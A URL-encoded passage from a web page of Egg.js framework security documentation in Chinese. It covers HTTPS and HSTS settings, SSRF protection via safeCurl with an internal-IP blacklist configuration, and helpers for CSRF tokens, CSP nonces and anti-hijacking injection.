%B9%E7%94%A8%E6%88%B7%E6%9B%B4%E5%8A%A0%E5%AE%89%E5%85%A8%E3%80%82%E5%AF%B9%E4%BA%8E%E8%87%AA%E8%BA%AB%E8%80%8C%E8%A8%80%E9%99%A4%E4%BA%86%E4%BF%9D%E9%9A%9C%E7%94%A8%E6%88%B7%E5%88%A9%E7%9B%8A%E5%A4%96%EF%BC%8C%E8%BF%98%E5%8F%AF%E9%81%BF%E5%85%8D%E6%9C%AC%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84%E6%B5%81%E9%87%8F%E8%A2%AB%E6%8C%9F%E6%8C%81%EF%BC%8C%E4%BB%A5%E4%BF%9D%E6%8A%A4%E8%87%AA%E8%BA%AB%E5%88%A9%E7%9B%8A%E3%80%82%0A%0A%E5%B0%BD%E7%AE%A1%20HTTPS%20%E5%B9%B6%E9%9D%9E%E7%BB%9D%E5%AF%B9%E5%AE%89%E5%85%A8%EF%BC%8C%E6%8E%8C%E6%8F%A1%E6%A0%B9%E8%AF%81%E4%B9%A6%E7%9A%84%E6%9C%BA%E6%9E%84%E3%80%81%E6%8E%8C%E6%8F%A1%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E7%9A%84%E7%BB%84%E7%BB%87%E5%90%8C%E6%A0%B7%E5%8F%AF%E4%BB%A5%E8%BF%9B%E8%A1%8C%E4%B8%AD%E9%97%B4%E4%BA%BA%E5%BD%A2%E5%BC%8F%E7%9A%84%E6%94%BB%E5%87%BB%E3%80%82%E4%B8%8D%E8%BF%87HTTPS%E6%98%AF%E7%8E%B0%E8%A1%8C%E6%9E%B6%E6%9E%84%E4%B8%8B%E6%9C%80%E5%AE%89%E5%85%A8%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%EF%BC%8C%E5%B9%B6%E4%B8%94%E5%AE%83%E5%A4%A7%E5%B9%85%E5%A2%9E%E5%8A%A0%E4%BA%86%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E7%9A%84%E6%88%90%E6%9C%AC%E3%80%82%0A%0A%E5%9B%A0%E6%AD%A4%EF%BC%8C%E8%AF%B7%E5%90%84%E4%BD%8D%E4%BD%BF%E7%94%A8%20Egg%20%E6%A1%86%E6%9E%B6%E5%BC%80%E5%8F%91%E7%BD%91%E7%AB%99%E7%9A%84%E5%BC%80%E5%8F%91%E8%80%85%EF%BC%8C%E5%8A%A1%E5%BF%85%E6%8E%A8%E5%8A%A8%E8%87%AA%E5%B7%B1%E7%9A%84%E7%BD%91%E7%AB%99%E5%8D%87%E7%BA%A7%E5%88%B0%20HTTPS%E3%80%82%0A%0A%E5%AF%B9%E4%BA%8E%20HTTPS%20%E6%9D%A5%E8%AE%B2%EF%BC%8C%E8%BF%98%E6%9C%89%E4%B8%80%E7%82%B9%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E6%98%AF%20HTTP%20%E4%B8%A5%E6%A0%BC%E4%BC%A0%E8%BE%93%E5%AE%89%E5%85%A8%EF%BC%88HSTS%EF%BC%89%EF%BC%8C%E5%A6%82%E6%9E%9C%E4%B8%8D%E4%BD%BF%E7%94%A8%20HSTS%EF%BC%8C%E5%BD%93%E7%94%A8%E6%88%B7%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E8%BE%93%E5%85%A5%E7%BD%91%E5%9D%80%E6%97%B6%E6%B2%A1%E6%9C%89%E5%8A%A0%20HTTPS%EF%BC%8C%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BC%9A%E9%BB%98%E8%AE%A4%E4%BD%BF%E7%94%A8%20HTTP%20%E8%AE%BF%E9%97%AE%0A%0A%E6%A1%86%E6%9E%B6%E6%8F%90%E4%BE%9B%E4%BA%86%20%60hsts%20Strict-Transport-Security%60%20%E8%BF%99%E4%B8%AA%E5%A4%B4%E7%9A%84%E9%BB%98%E8%AE%A4%E5%BC%80%E5%90%AF%E3%80%82%E8%AE%A9%20HTTPS%20%E7%AB%99%E7%82%B9%E4%B8%8D%E8%B7%B3%E8%BD%AC%E5%88%B0%20HTTP%EF%BC%8C%E5%A6%82%E6%9E%9C%E7%AB%99%E7%82%B9%E6%94%AF%E6%8C%81%20HTTPS%EF%BC%8C%E8%AF%B7%E4%B8%80%E5%AE%9A%E8%A6%81%E5%BC%80%E5%90%AF%E3%80%82%0A%0A%E5%A6%82%E6%9E%9C%E6%88%91%E4%BB%AC%E7%9A%84Web%20%E7%AB%99%E7%82%B9%E6%98%AF%20http%20%E7%AB%99%E7%82%B9%EF%BC%8C%E9%9C%80%E8%A6%81%E5%85%B3%E9%97%AD%E8%BF%99%E4%B8%AA%E5%A4%B4%E3%80%82%E9%85%8D%E7%BD%AE%E5%A6%82%E4%B8%8B%EF%BC%9A%0A%0A-%20maxAge%20%E9%BB%98%E8%AE%A4%E4%B8%80%E5%B9%B4%20%60365%20*%2024%20*%203600%60%E3%80%82%0A-%20includeSubdomains%20%E9%BB%98%E8%AE%A4%20false%2C%20%E5%8F%AF%E4%BB%A5%E6%B7%BB%E5%8A%A0%E5%AD%90%E5%9F%9F%E5%90%8D%EF%BC%8C%E4%BF%9D%E8%AF%81%E6%89%80%E6%9C%89%E5%AD%90%E5%9F%9F%E5%90%8D%E9%83%BD%E4%BD%BF%E7%94%A8%20HTTPS%20%E8%AE%BF%E9%97%AE%E3%80%82%0A%0A%23%23%20%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%81%20SSRF%20%E7%9A%84%E9%98%B2%E8%8C%83%0A%0A%E9%80%9A%E8%BF%87%20%5BServer-Side%20Request%20Forgery(SSRF)%5D(https%3A%2F%2Fwww.owasp.org%2Findex.php%2FServer_Side_Request_Forgery)%20%E6%94%BB%E5%87%BB%EF%BC%8C%E6%94%BB%E5%87%BB%E8%80%85%E5%8F%AF%E4%BB%A5%E5%8F%91%E8%B5%B7%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82%E8%AE%BF%E9%97%AE%E6%88%96%E8%80%85%E6%93%8D%E4%BD%9C%E5%86%85%E9%83%A8%E7%BD%91%E7%BB%9C%E7%9A%84%E8%B5%84%E6%BA%90%E3%80%82%0A%0A%E4%B8%80%E8%88%AC%E6%9D%A5%E8%AF%B4%EF%BC%8CSSRF%20%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%B8%B8%E8%A7%81%E4%BA%8E%E5%BC%80%E5%8F%91%E8%80%85%E5%9C%A8%E6%9C%8D%E5%8A%A1%E7%AB%AF%E7%9B%B4%E6%8E%A5%E8%AF%B7%E6%B1%82%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BC%A0%E9%80%92%E8%BF%9B%E6%9D%A5%E7%9A%84%20URL%20%E8%B5%84%E6%BA%90%EF%BC%8C%E4%B8%80%E6%97%A6%E6%94%BB%E5%87%BB%E8%80%85%E4%BC%A0%E5%85%A5%E4%B8%80%E4%BA%9B%E5%86%85%E9%83%A8%E7%9A%84%20URL%20%E5%8D%B3%E5%8F%AF%E5%8F%91%E8%B5%B7%20SSRF%20%E6%94%BB%E5%87%BB%E3%80%82%0A%0A%23%23%23%20%E5%A6%82%E4%BD%95%E9%98%B2%E8%8C%83%0A%0A%E9%80%9A%E5%B8%B8%E6%88%91%E4%BB%AC%E4%BC%9A%E5%9F%BA%E4%BA%8E%E5%86%85%E7%BD%91%20IP%20%E9%BB%91%E5%90%8D%E5%8D%95%E7%9A%84%E5%BD%A2%E5%BC%8F%E6%9D%A5%E9%98%B2%E8%8C%83%20SSRF%20%E6%94%BB%E5%87%BB%EF%BC%8C%E9%80%9A%E8%BF%87%E5%AF%B9%E8%A7%A3%E6%9E%90%E5%9F%9F%E5%90%8D%E5%90%8E%E5%BE%97%E5%88%B0%E7%9A%84%20IP%20%E5%81%9A%E8%BF%87%E6%BB%A4%EF%BC%8C%E7%A6%81%E6%AD%A2%E8%AE%BF%E9%97%AE%E5%86%85%E9%83%A8%20IP%20%E5%9C%B0%E5%9D%80%E6%9D%A5%E8%BE%BE%E5%88%B0%E9%98%B2%E8%8C%83%20SSRF%20%E6%94%BB%E5%87%BB%E7%9A%84%E7%9B%AE%E7%9A%84%E3%80%82%0A%0A%E6%A1%86%E6%9E%B6%E5%9C%A8%20%60ctx%60%2C%20%60app%60%20%E5%92%8C%20%60agent%60%20%E4%B8%8A%E9%83%BD%E6%8F%90%E4%BE%9B%E4%BA%86%20%60safeCurl%60%20%E6%96%B9%E6%B3%95%EF%BC%8C%E5%9C%A8%E5%8F%91%E8%B5%B7%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82%E7%9A%84%E5%90%8C%E6%97%B6%E4%BC%9A%E5%AF%B9%E6%8C%87%E5%AE%9A%E7%9A%84%E5%86%85%E7%BD%91%20IP%20%E5%9C%B0%E5%9D%80%E8%BF%87%E6%BB%A4%EF%BC%8C%E9%99%A4%E6%AD%A4%E4%B9%8B%E5%A4%96%EF%BC%8C%E8%AF%A5%E6%96%B9%E6%B3%95%E5%92%8C%E6%A1%86%E6%9E%B6%E6%8F%90%E4%BE%9B%E7%9A%84%20%60curl%60%20%E6%96%B9%E6%B3%95%E4%B8%80%E8%87%B4%E3%80%82%0A%0A-%20%60ctx.safeCurl(url%2C%20options)%60%0A-%20%60app.safeCurl(url%2C%20options)%60%0A-%20%60agent.safeCurl(url%2C%20options)%60%0A%0A%23%23%23%23%20%E9%85%8D%E7%BD%AE%0A%0A%E7%9B%B4%E6%8E%A5%E8%B0%83%E7%94%A8%20%60safeCurl%60%20%E6%96%B9%E6%B3%95%E5%85%B6%E5%AE%9E%E5%B9%B6%E6%B2%A1%E6%9C%89%E4%BB%BB%E4%BD%95%E4%BD%9C%E7%94%A8%EF%BC%8C%E8%BF%98%E9%9C%80%E8%A6%81%E9%85%8D%E5%90%88%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%E9%A1%B9%E3%80%82%0A%0A-%20%60ipBlackList%60(Array)%20-%20%08%E9%85%8D%E7%BD%AE%E5%86%85%E7%BD%91%20IP%20%E5%90%8D%E5%8D%95%EF%BC%8C%E5%9C%A8%E8%BF%99%E4%BA%9B%E7%BD%91%E6%AE%B5%E5%86%85%E7%9A%84%20IP%20%E5%9C%B0%E5%9D%80%E6%97%A0%E6%B3%95%E8%A2%AB%E8%AE%BF%E9%97%AE%E3%80%82%0A-%20%60checkAddress%60(Function)%20-%20%E7%9B%B4%E6%8E%A5%E9%85%8D%E7%BD%AE%E4%B8%80%E4%B8%AA%E6%A3%80%E6%9F%A5%20IP%20%E5%9C%B0%E5%9D%80%E7%9A%84%E5%87%BD%E6%95%B0%EF%BC%8C%E6%A0%B9%E6%8D%AE%E5%87%BD%E6%95%B0%E7%9A%84%E8%BF%94%E5%9B%9E%E5%80%BC%E6%9D%A5%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%85%81%E8%AE%B8%E5%9C%A8%20%60safeCurl%60%20%E4%B8%AD%E8%A2%AB%E8%AE%BF%E9%97%AE%EF%BC%8C%E5%BD%93%E8%BF%94%E5%9B%9E%E9%9D%9E%20%60true%60%20%E6%97%B6%EF%BC%8C%E8%AF%A5%20IP%20%E6%97%A0%E6%B3%95%E8%A2%AB%E8%AE%BF%E9%97%AE%E3%80%82%60checkAddress%60%20%E4%BC%98%E5%85%88%E7%BA%A7%E9%AB%98%E4%BA%8E%20%60ipBlackList%60%E3%80%82%0A%0A%60%60%60js%0A%2F%2F%20config%2Fconfig.default.js%0Aexports.security%20%3D%20%7B%0A%20%20ssrf%3A%20%7B%0A%20%20%20%20ipBlackList%3A%20%5B%0A%20%20%20%20%20%20'10.0.0.0%2F8'%2C%20%2F%2F%20%E6%94%AF%E6%8C%81%20IP%20%E7%BD%91%E6%AE%B5%0A%20%20%20%20%20%20'0.0.0.0%2F32'%2C%0A%20%20%20%20%20%20'127.0.0.1'%2C%20%20%2F%2F%20%E6%94%AF%E6%8C%81%E6%8C%87%E5%AE%9A%20IP%20%E5%9C%B0%E5%9D%80%0A%20%20%20%20%5D%2C%0A%20%20%20%20%2F%2F%20%E9%85%8D%E7%BD%AE%E4%BA%86%20checkAddress%20%E6%97%B6%EF%BC%8CipBlackList%20%E4%B8%8D%E4%BC%9A%E7%94%9F%E6%95%88%0A%20%20%20%20checkAddress(ip)%20%7B%0A%20%20%20%20%20%20return%20ip%20!%3D%3D%20'127.0.0.1'%3B%0A%20%20%20%20%7D%2C%0A%20%20%7D%2C%0A%7D%3B%0A%60%60%60%0A%0A%23%23%20%E5%85%B6%E4%BB%96%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%0A%0A%23%23%23%20ctx.isSafeDomain(domain)%0A%0A%E6%98%AF%E5%90%A6%E4%B8%BA%E5%AE%89%E5%85%A8%E5%9F%9F%E5%90%8D%E3%80%82%E5%AE%89%E5%85%A8%E5%9F%9F%E5%90%8D%E5%9C%A8%E9%85%8D%E7%BD%AE%E4%B8%AD%E9%85%8D%E7%BD%AE%EF%BC%8C%E8%A7%81%20%60ctx.redirect%60%20%E9%83%A8%E5%88%86%E3%80%82%0A%0A%23%23%23%20app.injectCsrf(str)%0A%0A%E8%BF%99%E4%B8%AA%E5%87%BD%E6%95%B0%E6%8F%90%E4%BE%9B%E4%BA%86%E6%A8%A1%E6%9D%BF%E9%A2%84%E5%A4%84%E7%90%86%EF%BC%8D%E8%87%AA%E5%8A%A8%E6%8F%92%E5%85%A5%20CSRF%20key%20%E7%9A%84%E8%83%BD%E5%8A%9B%EF%BC%8C%E5%8F%AF%E4%BB%A5%E8%87%AA%E5%8A%A8%E5%9C%A8%E6%89%80%E6%9C%89%E7%9A%84%20form%20%E6%A0%87%E7%AD%BE%E4%B8%AD%E6%8F%92%E5%85%A5%20CSRF%20%E9%9A%90%E8%97%8F%E5%9F%9F%EF%BC%8C%E7%94%A8%E6%88%B7%E5%B0%B1%E4%B8%8D%E9%9C%80%E8%A6%81%E6%89%8B%E5%8A%A8%E5%86%99%E4%BA%86%E3%80%82%0A%0A%23%23%23%20app.injectNonce(str)%0A%0A%E8%BF%99%E4%B8%AA%E5%87%BD%E6%95%B0%E6%8F%90%E4%BE%9B%E4%BA%86%E6%A8%A1%E6%9D%BF%E9%A2%84%E5%A4%84%E7%90%86%EF%BC%8D%E8%87%AA%E5%8A%A8%E6%8F%92%E5%85%A5%20nonce%20%E7%9A%84%E8%83%BD%E5%8A%9B%EF%BC%8C%E5%A6%82%E6%9E%9C%E7%BD%91%E7%AB%99%E5%BC%80%E5%90%AF%E4%BA%86%20CSP%20%E5%AE%89%E5%85%A8%E5%A4%B4%EF%BC%8C%E5%B9%B6%E4%B8%94%E6%83%B3%E4%BD%BF%E7%94%A8%20%60%20CSP%202.0%20nonce%60%20%E7%89%B9%E6%80%A7%EF%BC%8C%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8%E8%BF%99%E4%B8%AA%E5%87%BD%E6%95%B0%E3%80%82%E5%8F%82%E8%80%83%20%5BCSP%20%E6%98%AF%E4%BB%80%E4%B9%88%5D(https%3A%2F%2Fwww.zhihu.com%2Fquestion%2F21979782)%E3%80%82%0A%0A%E8%BF%99%E4%B8%AA%E5%87%BD%E6%95%B0%E4%BC%9A%E6%89%AB%E6%8F%8F%E6%A8%A1%E6%9D%BF%E4%B8%AD%E7%9A%84%20script%20%E6%A0%87%E7%AD%BE%EF%BC%8C%E5%B9%B6%E8%87%AA%E5%8A%A8%E5%8A%A0%E4%B8%8A%20nonce%20%E5%A4%B4%E3%80%82%0A%0A%23%23%23%20app.injectHijackingDefense(str)%0A%0A%E5%AF%B9%E4%BA%8E%E6%B2%A1%E6%9C%89%E5%BC%80%E5%90%AF%20HTTPS%20%E7%9A%84%E7%BD%91%E7%AB%99%EF%BC%8C%E8%BF%99%E4%B8%AA%E5%87%BD%E6%95%B0%E5%8F%AF%E4%BB%A5%E6%9C%89%E9%99%90%E7%9A%84%E9%98%B2%E6%AD%A2%E8%BF%90%E8%90%A5%E5%95%86%E5%8A%AB%E6%8C%81%E3%80%82%0A%0A%0A%5Begg-view-nunjucks%5D%3A%20https%3A%2F%2Fgithub.com%2Feggjs%2Fegg-view-nunjucks%0A"}}</script><script type="text/javascript" src="/static/js/post.b9faab88.js"></script></body></html>